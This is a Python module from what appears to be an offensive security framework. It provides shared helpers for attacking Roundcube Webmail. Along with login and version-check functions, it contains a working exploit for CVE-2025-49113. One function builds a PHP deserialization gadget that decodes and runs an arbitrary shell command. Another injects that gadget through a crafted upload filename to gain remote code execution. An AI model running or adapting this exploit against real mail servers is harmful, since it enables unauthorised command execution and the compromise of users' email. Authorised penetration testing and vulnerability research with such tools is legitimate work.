#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Shared Roundcube Webmail helpers (login, version, CVE-2025-49113 gadget)."""

from __future__ import annotations

import base64
import hashlib
import os
import re
import time
from typing import Any, Dict, Optional
from urllib.parse import urlencode

from core.framework.base_module import BaseModule

_RCVERSION_RE = re.compile(r'"rcversion"\s*:\s*(\d+)', re.I)
_TOKEN_RE = re.compile(
    r'<input[^>]+name=["\']_token["\'][^>]+value=["\']([^"\']+)["\']',
    re.I,
)
_TOKEN_RE_ALT = re.compile(
    r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']_token["\']',
    re.I,
)

PNG_1X1 = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg=="
)

FROM_CONTEXTS = ("compose", "reply", "import", "settings", "folders", "identity")


class Roundcube(BaseModule):
    """Helpers shared by Roundcube scanner / exploit modules."""

    @staticmethod
    def rc_normalize_base(path_value: Any) -> str:
        value = str(path_value or "/").strip() or "/"
        if not value.startswith("/"):
            value = "/" + value
        return value.rstrip("/")

    @classmethod
    def rc_join(cls, base_path: Any, query: str = "") -> str:
        root = cls.rc_normalize_base(base_path)
        path = f"{root}/" if root else "/"
        if query:
            path = f"{path}?{query}"
        return path

    @staticmethod
    def rc_parse_version(rcversion: int) -> str:
        return f"{rcversion // 10000}.{(rcversion % 10000) // 100}.{rcversion % 100}"

    @staticmethod
    def rc_version_vulnerable(rcversion: int) -> bool:
        """CVE-2025-49113: < 1.5.10 and 1.6.0–1.6.10 (rcversion MMmmpp)."""
        return (10100 <= rcversion <= 10509) or (10600 <= rcversion <= 10610)

    @staticmethod
    def rc_extract_version(body: str) -> Optional[int]:
        match = _RCVERSION_RE.search(body or "")
        if not match:
            return None
        try:
            return int(match.group(1))
        except ValueError:
            return None

    @staticmethod
    def rc_extract_token(body: str) -> Optional[str]:
        for pattern in (_TOKEN_RE, _TOKEN_RE_ALT):
            match = pattern.search(body or "")
            if match:
                token = (match.group(1) or "").strip()
                if token:
                    return token
        return None

    @staticmethod
    def rc_looks_like_roundcube(body: str) -> bool:
        low = (body or "").lower()
        return "roundcube" in low or "rcversion" in low

    @staticmethod
    def rc_build_gpg_gadget(command: str) -> str:
        """Crypt_GPG_Engine serialized gadget (MSF-compatible)."""
        encoded = base64.b32encode(command.encode("utf-8")).decode("ascii")
        gpgconf = f'echo "{encoded}"|base32 -d|sh &#'
        length = len(gpgconf.encode("utf-8"))
        return (
            '|O:16:"Crypt_GPG_Engine":3:{'
            's:8:"_process";b:0;'
            f's:8:"_gpgconf";s:{length}:"{gpgconf}";'
            's:8:"_homedir";s:0:"";}'
            ";"
        )

    def rc_fetch_login(self, base_path: Any = "/"):
        return self.http_request(
            method="GET",
            path=self.rc_join(base_path, "_task=login"),
            allow_redirects=True,
        )

    def rc_login(
        self,
        username: str,
        password: str,
        token: str,
        *,
        base_path: Any = "/",
        host: str = "",
    ) -> Dict[str, Any]:
        data = {
            "_token": token,
            "_task": "login",
            "_action": "login",
            "_url": "_task=login",
            "_user": username,
            "_pass": password,
        }
        if host:
            data["_host"] = host

        res = self.http_request(
            method="POST",
            path=self.rc_join(base_path, "_task=login"),
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False,
        )
        if not res:
            return {"ok": False, "reason": "No response during login"}

        location = (res.headers.get("Location") or res.headers.get("location") or "").lower()
        cookie_blob = ""
        try:
            cookie_blob = ";".join(
                f"{c.name}={c.value}" for c in getattr(self.session, "cookies", [])
            ).lower()
        except Exception:
            pass

        ok = res.status_code in (301, 302, 303, 307, 308)
        if not ok and res.status_code == 200:
            body = (res.text or "").lower()
            ok = "invalid username or password" not in body and (
                "roundcube_sessid" in cookie_blob
                or "_task=mail" in location
                or "task=mail" in body
                or "mailbox" in body
            )

        if not ok:
            return {"ok": False, "reason": f"Login failed (HTTP {res.status_code})", "status": res.status_code}
        return {"ok": True, "status": res.status_code}

    def rc_upload_deserialize(
        self,
        serialized_filename: str,
        *,
        base_path: Any = "/",
        from_context: str = "settings",
    ):
        """POST settings upload with gadget in the multipart filename (CVE-2025-49113)."""
        boundary = "----KS" + self.random_text(12)
        filename = serialized_filename.replace('"', '\\"')
        upload_id = f"upload{int(time.time() * 1000)}"
        file_id = hashlib.md5(os.urandom(8) + str(time.time()).encode()).hexdigest()
        query = urlencode(
            {
                "_task": "settings",
                "_remote": "1",
                "_from": f"edit-!{from_context}",
                "_id": file_id,
                "_uploadid": upload_id,
                "_action": "upload",
            }
        )
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="_file[]"; filename="{filename}"\r\n'
            f"Content-Type: image/png\r\n\r\n"
        ).encode("utf-8") + PNG_1X1 + f"\r\n--{boundary}--\r\n".encode("utf-8")

        return self.http_request(
            method="POST",
            path=self.rc_join(base_path, query),
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            allow_redirects=False,
        )
